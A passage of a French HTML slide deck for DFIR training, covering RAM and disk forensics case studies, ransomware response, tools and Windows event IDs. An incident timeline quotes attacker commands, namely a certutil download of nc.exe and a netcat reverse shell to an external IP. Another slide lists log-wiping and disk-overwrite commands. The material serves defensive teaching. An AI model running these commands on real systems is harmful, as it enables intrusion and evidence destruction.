+          <span class="term-prompt">log2timeline.py</span><span class="term-out"> timeline.plaso disk.dd</span><br>
+          <span class="term-prompt">psort.py</span><span class="term-out"> -o l2tcsv timeline.plaso > timeline.csv</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ■ SLIDE 3 · JOURNÉE TYPE ── -->
+<div class="slide" data-index="3" data-qcm="3">
+  <div class="slide-tag">// 03 · Terrain</div>
+  <h2>Journée type · Analyste DFIR en mission incident</h2>
+  <div class="grid2">
+    <div class="card">
+      <div class="blabel">Scénario : activation d'un incident P1</div>
+      <div class="timeline">
+        <div class="tl-item"><div class="tl-time">06:47</div><div class="tl-content"><strong>Alerte EDR critique</strong> — CrowdStrike détecte une injection de processus sur un serveur de production. L'analyste de nuit active le war room et appelle l'équipe DFIR.</div></div>
+        <div class="tl-item"><div class="tl-time">07:15</div><div class="tl-content"><strong>Briefing de crise</strong> — RSSI, DSI, juriste. Activation du plan de réponse aux incidents. Attribution des rôles : Lead IR, Forensics, Communications, Legal.</div></div>
+        <div class="tl-item"><div class="tl-time">07:30</div><div class="tl-content"><strong>Isolation réseau</strong> — Couper les machines suspectes du réseau (firewall ACL, VLAN isolation) sans les éteindre. Préserver la RAM et les connexions actives.</div></div>
+        <div class="tl-item"><div class="tl-time">08:00</div><div class="tl-content"><strong>Acquisition mémoire RAM</strong> — DumpIt sur les 3 machines isolées. Chaque dump est hashé et horodaté. Copie sur support forensique dédié hors réseau.</div></div>
+        <div class="tl-item"><div class="tl-time">09:00</div><div class="tl-content"><strong>Analyse Volatility</strong> — Processus suspects, connexions C2 actives, DLL injections, credentials en mémoire. Premier pivot : identification de l'IP C2.</div></div>
+        <div class="tl-item"><div class="tl-time">11:00</div><div class="tl-content"><strong>Investigation EDR &amp; logs</strong> — Requêtes CloudTrail, logs AD (4624/4625/4688/4698), Sysmon. Reconstruction de la kill chain.</div></div>
+        <div class="tl-item"><div class="tl-time">14:00</div><div class="tl-content"><strong>Rapport d'avancement</strong> — Point avec la direction : périmètre confirmé, données potentiellement exfiltrées ?, décision sur la notification RGPD (72h).</div></div>
+        <div class="tl-item"><div class="tl-time">17:00</div><div class="tl-content"><strong>Containment complet</strong> — Reset credentials compromis, suppression persistence, blocage IOCs dans le SIEM. Début de la phase de reconstruction.</div></div>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card card-red">
+        <div class="blabel" style="color:rgba(255,68,102,.4)">La règle d'or : isoler SANS éteindre</div>
+        <div class="quote quote-red" style="font-size:.82rem;margin-bottom:.6rem">
+          Éteindre une machine compromise en cours d'analyse, c'est brûler la scène de crime. La RAM, les processus actifs, les connexions C2 en cours, les clés de déchiffrement — tout disparaît en quelques secondes.
+        </div>
+        <ul class="bullets" style="gap:.3rem;font-size:.8rem">
+          <li class="ok"><strong>Isoler réseau</strong> — Couper le câble ou désactiver la NIC via EDR</li>
+          <li class="ok"><strong>Dumper la RAM</strong> — Avant toute autre action forensique</li>
+          <li class="bad"><strong>Ne jamais éteindre</strong> — Sauf si l'attaquant chiffre activement les données</li>
+          <li class="bad"><strong>Ne pas relancer</strong> — Chaque reboot écrase les artefacts volatils</li>
+        </ul>
+      </div>
+      <div class="card card-yellow">
+        <div class="blabel" style="color:rgba(255,215,0,.4)">Stack technique DFIR au quotidien</div>
+        <div class="tag-list">
+          <span class="tag tag-y">Volatility 3</span><span class="tag tag-y">Autopsy / FTK</span>
+          <span class="tag tag-y">Velociraptor</span><span class="tag tag-y">TheHive</span>
+          <span class="tag tag-y">Plaso / Timesketch</span><span class="tag tag-y">Wireshark</span>
+          <span class="tag tag-y">Hayabusa</span><span class="tag tag-y">KAPE</span>
+          <span class="tag tag-y">Eric Zimmerman Tools</span><span class="tag tag-y">Ghidra</span>
+        </div>
+      </div>
+      <div class="terminal">
+        <span class="term-prompt">// </span><span class="term-out">Un analyste DFIR ne panique jamais.<br>Il documente, il priorise, il agit méthodiquement.<br>La pression est maximale — la rigueur doit l'être aussi.</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ■ SLIDE 4 · CAS CONCRET 1 · ANALYSE RAM ── -->
+<div class="slide" data-index="4" data-qcm="4">
+  <div class="slide-tag">// 04 · Cas Concret</div>
+  <div style="text-align:center;margin-bottom:.4rem">
+    <span class="cas-badge">🔴 CAS CONCRET #1</span>
+    <h2 style="margin-bottom:.1rem">Analyse mémoire RAM — Mimikatz détecté</h2>
+    <div style="font-family:var(--mono);font-size:.62rem;color:rgba(170,68,255,.3)">Volatility 3 · Credential Dump · Process Injection · Windows 10</div>
+  </div>
+  <div class="grid2">
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card card-red">
+        <div class="blabel" style="color:rgba(255,68,102,.4)">Contexte — Alerte EDR</div>
+        <div class="terminal terminal-red" style="font-size:.67rem;line-height:1.85;margin-bottom:.6rem">
+          <span class="term-err">[CrowdStrike] CRITICAL — Credential Theft Detected</span><br>
+          <span class="term-out">Host     : WS-FINANCE-12 · Windows 10 22H2</span><br>
+          <span class="term-out">User     : marie.dupont (Domain Admin)</span><br>
+          <span class="term-out">Process  : svchost.exe (PID 4412) → LSASS access</span><br>
+          <span class="term-out">Time     : 2024-03-15 03:22:41 UTC</span><br>
+          <span class="term-warn">Technique: T1003.001 · LSASS Memory</span>
+        </div>
+        <div class="blabel" style="color:rgba(255,68,102,.4)">Questions à résoudre</div>
+        <ul class="bullets" style="gap:.3rem;font-size:.8rem">
+          <li>Quel processus a accédé à LSASS ? Est-il légitime ?</li>
+          <li>Y a-t-il eu injection dans un processus parent légitime ?</li>
+          <li>Quels credentials ont été dumpés ?</li>
+          <li>Y a-t-il des connexions réseau suspectes en mémoire ?</li>
+          <li>Depuis quand l'attaquant est-il présent sur la machine ?</li>
+        </ul>
+      </div>
+      <div class="card card-blue">
+        <div class="blabel" style="color:rgba(68,136,255,.4)">Volatility 3 — Commandes d'investigation</div>
+        <div class="terminal terminal-blue" style="font-size:.62rem;line-height:1.9">
+          <span class="term-out"># 1. Lister les processus actifs au moment du dump</span><br>
+          <span style="color:var(--blue)">vol</span><span class="term-out"> -f ram.dmp windows.pslist</span><br>
+          <span class="term-out"># 2. Détecter les injections de code (hollow/injection)</span><br>
+          <span style="color:var(--blue)">vol</span><span class="term-out"> -f ram.dmp windows.malfind</span><br>
+          <span class="term-out"># 3. Connexions réseau au moment du dump</span><br>
+          <span style="color:var(--blue)">vol</span><span class="term-out"> -f ram.dmp windows.netstat</span><br>
+          <span class="term-out"># 4. DLLs chargées par un process suspect</span><br>
+          <span style="color:var(--blue)">vol</span><span class="term-out"> -f ram.dmp windows.dlllist --pid 4412</span><br>
+          <span class="term-out"># 5. Dump du processus injecté pour analyse</span><br>
+          <span style="color:var(--blue)">vol</span><span class="term-out"> -f ram.dmp windows.dumpfiles --pid 4412</span><br>
+          <span class="term-out"># 6. Strings Mimikatz dans la mémoire</span><br>
+          <span style="color:var(--blue)">strings</span><span class="term-out"> ram.dmp | grep -i "sekurlsa\|mimikatz\|wdigest"</span>
+        </div>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card">
+        <div class="blabel">Résultats de l'analyse — Findings</div>
+        <div class="step-list">
+          <div class="step"><span class="step-num" style="color:var(--red)">F1</span><div class="step-txt"><strong>Process creux (hollowing)</strong> — svchost.exe PID 4412 spawné par explorer.exe (anormal — svchost doit être enfant de services.exe). malfind détecte une région RWX avec du code injecté.</div></div>
+          <div class="step"><span class="step-num" style="color:var(--red)">F2</span><div class="step-txt"><strong>Connexion C2 active</strong> — netstat révèle une connexion ESTABLISHED vers 185.220.x.x:443 depuis le process injecté. IP appartenant à un exit node Tor.</div></div>
+          <div class="step"><span class="step-num" style="color:var(--orange)">F3</span><div class="step-txt"><strong>Strings Mimikatz</strong> — "sekurlsa::logonpasswords", "lsadump::dcsync" trouvés dans la mémoire du process. Credentials NTLM potentiellement exfiltrés.</div></div>
+          <div class="step"><span class="step-num" style="color:var(--yellow)">F4</span><div class="step-txt"><strong>Pivot latéral</strong> — Dans le registre mémoire, connexions SMB vers 3 autres machines du domaine dans les 30 minutes précédant l'alerte.</div></div>
+          <div class="step"><span class="step-num" style="color:var(--green)">F5</span><div class="step-txt"><strong>Persistence</strong> — Clé Run dans le registre en mémoire : <code style="color:var(--green);font-size:.72rem">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> pointant vers %TEMP%\svc.exe</div></div>
+        </div>
+      </div>
+      <div class="card card-yellow">
+        <div class="blabel" style="color:rgba(255,215,0,.4)">Remédiation immédiate</div>
+        <ul class="bullets" style="gap:.3rem;font-size:.8rem">
+          <li class="ok">Isoler les 3 machines identifiées comme cibles de pivot</li>
+          <li class="ok">Reset forcé de TOUS les mots de passe du domaine (compromise confirmé)</li>
+          <li class="ok">Révoquer tous les tickets Kerberos (krbtgt reset ×2)</li>
+          <li class="ok">Bloquer l'IP C2 sur tous les firewalls + IOC dans le SIEM</li>
+          <li class="ok">Supprimer la clé de registre de persistence + svc.exe</li>
+          <li class="warn">Notification RGPD CNIL sous 72h si données personnelles exposées</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ■ SLIDE 5 · CAS CONCRET 2 · FORENSICS DISQUE ── -->
+<div class="slide" data-index="5" data-qcm="5">
+  <div class="slide-tag">// 05 · Cas Concret</div>
+  <div style="text-align:center;margin-bottom:.4rem">
+    <span class="cas-badge">🔴 CAS CONCRET #2</span>
+    <h2 style="margin-bottom:.1rem">Forensics disque — Reconstituer l'intrusion</h2>
+    <div style="font-family:var(--mono);font-size:.62rem;color:rgba(170,68,255,.3)">Autopsy · KAPE · Eric Zimmerman Tools · Artefacts Windows · Post-mortem</div>
+  </div>
+  <div class="grid2">
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card card-orange">
+        <div class="blabel" style="color:rgba(255,136,0,.4)">Contexte — Machine compromise retrouvée froide</div>
+        <div class="quote quote-orange" style="margin-bottom:.6rem;font-size:.82rem">
+          Un serveur web a été trouvé <strong>éteint par l'attaquant</strong> après l'incident.<br>
+          Pas de RAM disponible. Seul le disque peut parler.<br>
+          Mission : reconstituer ce qui s'est passé les 72 dernières heures<br>
+          et identifier comment l'attaquant est entré.
+        </div>
+        <div class="blabel" style="color:rgba(255,136,0,.4)">Artefacts analysés</div>
+        <div class="terminal terminal-orange" style="font-size:.63rem;line-height:1.9">
+          <span style="color:var(--orange)">Prefetch      </span><span class="term-out">→ cmd.exe, powershell.exe, certutil.exe</span><br>
+          <span style="color:var(--orange)">Event 4688    </span><span class="term-out">→ Créations de processus avec ligne de commande</span><br>
+          <span style="color:var(--orange)">IIS Logs      </span><span class="term-out">→ POST /upload.php — WebShell déposé</span><br>
+          <span style="color:var(--orange)">Amcache.hve   </span><span class="term-out">→ nc.exe, meterpreter.exe, mimikatz.exe</span><br>
+          <span style="color:var(--orange)">MFT ($MFT)    </span><span class="term-out">→ Fichiers créés/modifiés/supprimés</span><br>
+          <span style="color:var(--orange)">ShimCache     </span><span class="term-out">→ whoami, net user, systeminfo exécutés</span>
+        </div>
+      </div>
+      <div class="card card-blue">
+        <div class="blabel" style="color:rgba(68,136,255,.4)">Timeline reconstruite — Chronologie de l'attaque</div>
+        <div class="timeline" style="font-size:.8rem">
+          <div class="tl-item"><div class="tl-time" style="color:var(--red)">J0 09:14</div><div class="tl-content"><strong>Initial access</strong> — Upload de evil.php via vulnérabilité unrestricted file upload. IIS logs : POST /upload.php 200 OK · IP: 92.118.x.x</div></div>
+          <div class="tl-item"><div class="tl-time" style="color:var(--red)">J0 09:17</div><div class="tl-content"><strong>Webshell exécuté</strong> — Prefetch : cmd.exe exécuté par w3wp.exe (IIS). Commandes : whoami, ipconfig, net user</div></div>
+          <div class="tl-item"><div class="tl-time" style="color:var(--orange)">J0 09:31</div><div class="tl-content"><strong>Download d'outils</strong> — certutil.exe -urlcache -f http://92.x.x.x/nc.exe. Amcache : nc.exe présent</div></div>
+          <div class="tl-item"><div class="tl-time" style="color:var(--orange)">J0 09:34</div><div class="tl-content"><strong>Reverse shell</strong> — nc.exe -e cmd.exe 92.x.x.x 4444. Connexion établie (NetFlow logs)</div></div>
+          <div class="tl-item"><div class="tl-time" style="color:var(--yellow)">J1 02:15</div><div class="tl-content"><strong>Privilege escalation</strong> — Event 4672 : Token d'accès spécial. mimikatz.exe dans Amcache. Hashes NTLM récupérés.</div></div>
+          <div class="tl-item"><div class="tl-time" style="color:var(--yellow)">J2 18:40</div><div class="tl-content"><strong>Exfiltration + effacement</strong> — WinRAR sur Documents/ puis FTP vers IP externe. Tentative de suppression des logs IIS (partielle).</div></div>
+        </div>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card">
+        <div class="blabel">KAPE — Triage rapide des artefacts</div>
+        <p style="font-size:.82rem;color:rgba(240,232,255,.8);line-height:1.5;margin-bottom:.5rem">KAPE (Kroll Artifact Parser and Extractor) collecte en <strong>quelques minutes</strong> tous les artefacts critiques d'un système Windows. Il existe des targets prédéfinies pour chaque use case forensique.</p>
+        <div class="terminal terminal-cyan" style="font-size:.63rem;line-height:1.85">
+          <span class="term-out"># Collecte rapide des artefacts IR</span><br>
+          <span style="color:var(--cyan)">kape.exe</span><span class="term-out"> --tsource C: \</span><br>
+          <span class="term-out">&nbsp;&nbsp;--tdest D:\Evidence \</span><br>
+          <span class="term-out">&nbsp;&nbsp;--target !SANS_Triage,EventLogs, \</span><br>
+          <span class="term-out">&nbsp;&nbsp;&nbsp;&nbsp;Prefetch,Amcache,NTDS \</span><br>
+          <span class="term-out">&nbsp;&nbsp;--module !EZParser</span><br>
+          <span class="term-ok"># Résultat : CSV parsés prêts pour Timesketch</span>
+        </div>
+        <div class="blabel" style="margin-top:.6rem">Eric Zimmerman Tools — Parse les artefacts</div>
+        <div class="tag-list">
+          <span class="tag tag-b">MFTECmd · MFT Parser</span>
+          <span class="tag tag-b">PECmd · Prefetch</span>
+          <span class="tag tag-b">RECmd · Registre</span>
+          <span class="tag tag-b">EvtxECmd · Event Logs</span>
+          <span class="tag tag-b">ShellBagsExplorer</span>
+          <span class="tag tag-b">WxTCmd · Timeline</span>
+        </div>
+      </div>
+      <div class="card card-green">
+        <div class="blabel" style="color:rgba(0,255,136,.35)">Lessons learned — Remédiation</div>
+        <ul class="bullets" style="gap:.3rem;font-size:.8rem">
+          <li class="ok">Patcher la vulnérabilité file upload (whitelist d'extensions)</li>
+          <li class="ok">Désactiver l'exécution PHP dans le répertoire uploads</li>
+          <li class="ok">WAF en mode blocage avec règles upload</li>
+          <li class="ok">Sysmon déployé pour loguer les créations de processus</li>
+          <li class="ok">Centraliser les logs IIS dans le SIEM avec rétention 90j</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ■ SLIDE 6 · CAS CONCRET 3 · IR RANSOMWARE ── -->
+<div class="slide" data-index="6" data-qcm="6">
+  <div class="slide-tag">// 06 · Cas Concret</div>
+  <div style="text-align:center;margin-bottom:.4rem">
+    <span class="cas-badge">🔴 CAS CONCRET #3</span>
+    <h2 style="margin-bottom:.1rem">Incident Response P0 — Attaque ransomware en cours</h2>
+    <div style="font-family:var(--mono);font-size:.62rem;color:rgba(170,68,255,.3)">Playbook IR complet · Velociraptor · Patient zéro · Rapport légal</div>
+  </div>
+  <div class="grid2">
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card card-red">
+        <div class="blabel" style="color:rgba(255,68,102,.4)">07h03 — Le téléphone sonne</div>
+        <div class="quote quote-red" style="font-size:.82rem;margin-bottom:.6rem">
+          Le DSI appelle : <strong>"La moitié des serveurs affichent une note de rançon."</strong><br>
+          Fichiers chiffrés avec extension <strong>.locked</strong>.<br>
+          Demande : 800 000$ en Bitcoin. Timer : 72h.<br>
+          Le groupe opère depuis 3 semaines sans être détecté.
+        </div>
+        <div class="blabel" style="color:rgba(255,68,102,.4)">Premières décisions — les 30 premières minutes</div>
+        <div class="step-list" style="font-size:.8rem">
+          <div class="step"><span class="step-num" style="color:var(--red)">T+0</span><div class="step-txt"><strong>Isolation réseau total</strong> — Couper tous les segments du réseau. Mieux vaut une interruption de service que la propagation continue.</div></div>
+          <div class="step"><span class="step-num" style="color:var(--red)">T+5</span><div class="step-txt"><strong>War room activé</strong> — RSSI, DG, juriste, communication. Décision : NE PAS payer (favorise la récidive, aucune garantie).</div></div>
+          <div class="step"><span class="step-num" style="color:var(--orange)">T+15</span><div class="step-txt"><strong>Conserver les machines chiffrées</strong> — Ne pas rebuilder immédiatement. La note de rançon et les fichiers chiffrés sont des preuves.</div></div>
+          <div class="step"><span class="step-num" style="color:var(--yellow)">T+30</span><div class="step-txt"><strong>Identification du ransomware</strong> — ID Ransomware (nomoreransom.org) : <strong>BlackBasta</strong>. Vérifier si un déchiffreur existe (spoiler : non).</div></div>
+        </div>
+      </div>
+      <div class="card card-blue">
+        <div class="blabel" style="color:rgba(68,136,255,.4)">Velociraptor — Chasse du patient zéro à grande échelle</div>
+        <p style="font-size:.78rem;color:rgba(240,232,255,.7);line-height:1.4;margin-bottom:.5rem">Velociraptor permet d'interroger simultanément des <strong>milliers de machines</strong> en temps réel pour trouver le patient zéro sans analyser chaque machine individuellement.</p>
+        <div class="terminal terminal-blue" style="font-size:.62rem;line-height:1.85">
+          <span class="term-out">/* Hunt VQL — trouver le premier .locked créé */</span><br>
+          <span style="color:var(--blue)">SELECT</span><span class="term-out"> Fqdn, FullPath, Mtime</span><br>
+          <span style="color:var(--blue)">FROM</span><span class="term-out"> glob(globs="C:/**/*.locked")</span><br>
+          <span style="color:var(--blue)">ORDER BY</span><span class="term-out"> Mtime</span><br>
+          <span style="color:var(--blue)">LIMIT</span><span class="term-out"> 1</span><br>
+          <span class="term-ok">/* Résultat : WS-COMPTA-03 — 2024-03-12 03:17 */</span><br>
+          <span class="term-out">/* Patient zéro identifié en 4 minutes sur 350 machines */</span>
+        </div>
+        <ul class="bullets" style="gap:.3rem;font-size:.78rem;margin-top:.5rem">
+          <li><strong>Patient zéro :</strong> WS-COMPTA-03 — poste du service comptabilité</li>
+          <li><strong>Vecteur initial :</strong> Macro Excel malveillante reçue par email J-21</li>
+          <li><strong>Séjour attaquant :</strong> 21 jours — exfiltration de 450GB avant chiffrement</li>
+        </ul>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card">
+        <div class="blabel">Rapport d'incident final — Structure légale</div>
+        <div class="step-list">
+          <div class="step"><span class="step-num">01</span><div class="step-txt"><strong>Executive Summary</strong> — 1 page. Impact business, timeline clé, conclusion sur l'attribution. Pour la direction et les assureurs.</div></div>
+          <div class="step"><span class="step-num">02</span><div class="step-txt"><strong>Timeline technique détaillée</strong> — Chaque action de l'attaquant horodatée avec la source de preuve. Attestable en justice.</div></div>
+          <div class="step"><span class="step-num">03</span><div class="step-txt"><strong>Indicators of Compromise (IOC)</strong> — Hashes, IPs, domaines C2, règles YARA, règles Sigma. Partagés avec le SIEM et les partenaires.</div></div>
+          <div class="step"><span class="step-num">04</span><div class="step-txt"><strong>Root cause analysis</strong> — Pourquoi l'attaque a réussi ? Quelle défaillance process/technique/humaine ?</div></div>
+          <div class="step"><span class="step-num">05</span><div class="step-txt"><strong>Plan de remédiation priorisé</strong> — Actions immédiates, court terme, long terme. Avec responsables et délais.</div></div>
+          <div class="step"><span class="step-num">06</span><div class="step-txt"><strong>Obligations légales</strong> — Notification CNIL (72h RGPD), dépôt de plainte police, notification aux assureurs cyber.</div></div>
+        </div>
+      </div>
+      <div class="card card-yellow">
+        <div class="blabel" style="color:rgba(255,215,0,.4)">Checklist reconstruction post-ransomware</div>
+        <ul class="bullets" style="gap:.3rem;font-size:.8rem">
+          <li class="ok">Rebuilder depuis les sauvegardes immuables les plus récentes (hors réseau)</li>
+          <li class="ok">Patcher toutes les CVE exploitées avant reconnexion</li>
+          <li class="ok">Changer TOUS les mots de passe du domaine (krbtgt ×2)</li>
+          <li class="ok">Déployer EDR sur 100% des endpoints avant reconnexion</li>
+          <li class="warn">Tester les backups AVANT l'incident — pas pendant</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ■ SLIDE 7 · OUTILS EN PROFONDEUR ── -->
+<div class="slide" data-index="7" data-qcm="7">
+  <div class="slide-tag">// 07 · Outils</div>
+  <h2>Les outils DFIR en profondeur</h2>
+  <div class="grid2">
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card" style="border-color:rgba(170,68,255,.25)">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:.5rem">
+          <div style="font-family:var(--display);font-weight:700;color:#fff">⭐ Volatility 3</div>
+          <span class="pill pill-green" style="font-size:.55rem">Open Source</span>
+        </div>
+        <p style="font-size:.78rem;color:rgba(240,232,255,.55);line-height:1.5;margin-bottom:.5rem">Le framework de référence mondiale pour l'analyse de mémoire RAM. Supporte Windows, Linux, macOS. Plugins pour processus, réseau, injections, registre, hives. Standard des CERT et CSIRT mondiaux.</p>
+        <ul class="bullets" style="gap:.25rem;font-size:.76rem">
+          <li class="ok">Totalement gratuit et open source</li>
+          <li class="ok">Communauté de plugins très active</li>
+          <li class="ok">Indispensable pour toute certification DFIR</li>
+          <li class="bad">Nécessite de connaître les profils OS (internals)</li>
+        </ul>
+        <div class="tag-list" style="margin-top:.5rem"><span class="tag">pslist</span><span class="tag">malfind</span><span class="tag">netstat</span><span class="tag">dlllist</span><span class="tag">hivelist</span><span class="tag">cmdline</span></div>
+      </div>
+      <div class="card card-orange">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:.5rem">
+          <div style="font-family:var(--display);font-weight:700;color:var(--orange)">Velociraptor</div>
+          <span class="pill pill-green" style="font-size:.55rem">Open Source</span>
+        </div>
+        <p style="font-size:.78rem;color:rgba(240,232,255,.55);line-height:1.5;margin-bottom:.5rem">Plateforme de collecte et chasse sur endpoint à grande échelle. Agent léger déployé sur tous les endpoints, interrogeable en temps réel via VQL (Velociraptor Query Language). Standard des grandes cellules IR.</p>
+        <ul class="bullets" style="gap:.25rem;font-size:.76rem">
+          <li class="ok">Interroger 10 000 machines simultanément</li>
+          <li class="ok">Collecte forensique distante sans déplacement</li>
+          <li class="ok">Artefacts KAPE intégrés nativement</li>
+          <li class="bad">Complexe à déployer en infrastructure from scratch</li>
+        </ul>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card card-blue">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:.5rem">
+          <div style="font-family:var(--display);font-weight:700;color:var(--blue)">Autopsy / FTK</div>
+          <span class="pill pill-yellow" style="font-size:.55rem">Confirmé</span>
+        </div>
+        <p style="font-size:.78rem;color:rgba(240,232,255,.55);line-height:1.5;margin-bottom:.5rem">GUI complète pour l'analyse forensique de disques. Autopsy (open source, basé sur The Sleuth Kit) et FTK (commercial) permettent de naviguer dans les systèmes de fichiers, récupérer les fichiers supprimés, analyser le registre, les logs, les artefacts web.</p>
+        <ul class="bullets" style="gap:.25rem;font-size:.76rem">
+          <li class="ok">Autopsy totalement gratuit</li>
+          <li class="ok">Récupération de fichiers supprimés (unallocated space)</li>
+          <li class="ok">Génération de rapports HTML/PDF pour tribunal</li>
+        </ul>
+      </div>
+      <div class="card card-pink">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:.5rem">
+          <div style="font-family:var(--display);font-weight:700;color:var(--pink)">Ghidra / IDA Pro</div>
+          <span class="pill pill-red" style="font-size:.55rem">Expert</span>
+        </div>
+        <p style="font-size:.78rem;color:rgba(240,232,255,.55);line-height:1.5;margin-bottom:.5rem">Reverse engineering de malwares. Ghidra (gratuit, NSA) et IDA Pro (référence commerciale) décompilent les binaires malveillants pour comprendre leur comportement : C2 hardcodé, capacités d'évasion, algorithme de chiffrement.</p>
+        <ul class="bullets" style="gap:.25rem;font-size:.76rem">
+          <li class="ok">Ghidra totalement gratuit et très puissant</li>
+          <li class="ok">Indispensable pour analyser un ransomware custom</li>
+          <li class="bad">Courbe d'apprentissage longue (assembleur x86/x64)</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ■ SLIDE 8 · ANALYSE RÉSEAU & LOGS ── -->
+<div class="slide" data-index="8" data-qcm="8">
+  <div class="slide-tag">// 08 · Réseau & Logs</div>
+  <h2>Forensics réseau &amp; analyse de logs Windows</h2>
+  <div class="grid2">
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card card-cyan">
+        <div class="blabel" style="color:rgba(0,221,255,.4)">Wireshark — Analyse PCAP forensique</div>
+        <p style="font-size:.82rem;color:rgba(240,232,255,.8);line-height:1.5;margin-bottom:.5rem">Un PCAP capturé pendant l'incident est une mine d'or. On peut reconstituer les communications C2, extraire les fichiers transférés, identifier les protocoles utilisés.</p>
+        <div class="terminal terminal-cyan" style="font-size:.62rem;line-height:1.9">
+          <span class="term-out"># Filtres Wireshark essentiels en DFIR</span><br>
+          <span style="color:var(--cyan)">http.request.method == "POST"</span><span class="term-out">  # Uploads</span><br>
+          <span style="color:var(--cyan)">dns.qry.name contains "pastebin"</span><span class="term-out"> # C2 via DNS</span><br>
+          <span style="color:var(--cyan)">tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0</span><span class="term-out"> # Scan</span><br>
+          <span style="color:var(--cyan)}>tcp.len > 1000000</span><span class="term-out">              # Exfil volumineuse</span><br>
+          <span style="color:var(--cyan)">smb2.filename contains ".exe"</span><span class="term-out">  # Lateral move</span><br>
+          <span class="term-out"># Extraire les fichiers d'un PCAP</span><br>
+          <span style="color:var(--cyan)">File → Export Objects → HTTP/SMB</span>
+        </div>
+      </div>
+      <div class="card card-yellow">
+        <div class="blabel" style="color:rgba(255,215,0,.4)">Event IDs Windows critiques en DFIR</div>
+        <div class="terminal terminal-yellow" style="font-size:.62rem;line-height:1.95">
+          <span class="term-warn">4624  </span><span class="term-out">Connexion réussie · Type 3=réseau · Type 10=remote</span><br>
+          <span class="term-warn">4625  </span><span class="term-out">Échec d'authentification → brute force</span><br>
+          <span class="term-warn">4648  </span><span class="term-out">Logon avec credentials explicites (runas)</span><br>
+          <span class="term-warn">4672  </span><span class="term-out">Privilèges spéciaux assignés → escalade</span><br>
+          <span class="term-warn">4688  </span><span class="term-out">Création de processus · voir la CmdLine</span><br>
+          <span class="term-warn">4698  </span><span class="term-out">Tâche planifiée créée → persistence</span><br>
+          <span class="term-warn">4720  </span><span class="term-out">Compte utilisateur créé → backdoor</span><br>
+          <span class="term-warn">7045  </span><span class="term-out">Service installé → persistence</span><br>
+          <span class="term-warn">1102  </span><span class="term-out">Journal d'audit effacé → anti-forensics !</span><br>
+          <span class="term-warn">4104  </span><span class="term-out">Script PowerShell exécuté (ScriptBlock)</span>
+        </div>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card card-blue">
+        <div class="blabel" style="color:rgba(68,136,255,.4)">Hayabusa — Détection rapide sur Event Logs</div>
+        <p style="font-size:.78rem;color:rgba(240,232,255,.7);line-height:1.4;margin-bottom:.5rem">Hayabusa analyse des gigaoctets de logs Windows Event (.evtx) en quelques minutes et génère une timeline d'alertes basée sur des règles Sigma. Parfait pour le triage initial d'un incident.</p>
+        <div class="terminal terminal-blue" style="font-size:.62rem;line-height:1.85">
+          <span class="term-out"># Analyser tous les event logs d'un dossier</span><br>
+          <span style="color:var(--blue)">hayabusa-x86_64</span><span class="term-out"> csv-timeline \</span><br>
+          <span class="term-out">&nbsp;&nbsp;--directory C:\Windows\System32\winevt\Logs \</span><br>
+          <span class="term-out">&nbsp;&nbsp;--output timeline.csv \</span><br>
+          <span class="term-out">&nbsp;&nbsp;--min-level medium</span><br>
+          <span class="term-ok"># Output : CSV avec alertes Sigma triées par timestamp</span><br>
+          <span class="term-out"># Importer dans Timesketch pour visualisation</span>
+        </div>
+      </div>
+      <div class="card card-green">
+        <div class="blabel" style="color:rgba(0,255,136,.35)">Anti-forensics — Ce que l'attaquant fait pour effacer ses traces</div>
+        <ul class="bullets" style="gap:.35rem;font-size:.8rem">
+          <li class="bad"><strong>Effacer les event logs</strong> — wevtutil cl System / Security (Event 1102)</li>
+          <li class="bad"><strong>Timestomping</strong> — Modifier les dates MACB des fichiers pour brouiller la timeline</li>
+          <li class="bad"><strong>Supprimer les prefetch</strong> — Effacer C:\Windows\Prefetch\ pour masquer les exécutions</li>
+          <li class="bad"><strong>Overwrite du disque</strong> — sdelete, cipher /w pour empêcher la récupération</li>
+          <li class="ok"><strong>La parade :</strong> Centraliser les logs (SIEM) avant l'incident. Ce qui est en dehors de la machine ne peut pas être effacé localement.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ■ SLIDE 9 · CARRIÈRE ── -->
+<div class="slide" data-index="9">
+  <div class="slide-tag">// 09 · Carrière</div>
+  <h2>Parcours de carrière · Analyste DFIR</h2>
+  <div class="grid2">
+    <div style="display:flex;flex-direction:column;gap:.65rem">
+      <div class="card">
+        <div class="blabel">Progression type</div>
+        <div class="step-list" style="gap:.75rem">
+          <div class="step">
+            <span class="step-num" style="background:rgba(170,68,255,.07);padding:.2rem .45rem;color:var(--purple);min-width:3.5rem;text-align:center">AN 1-2</span>
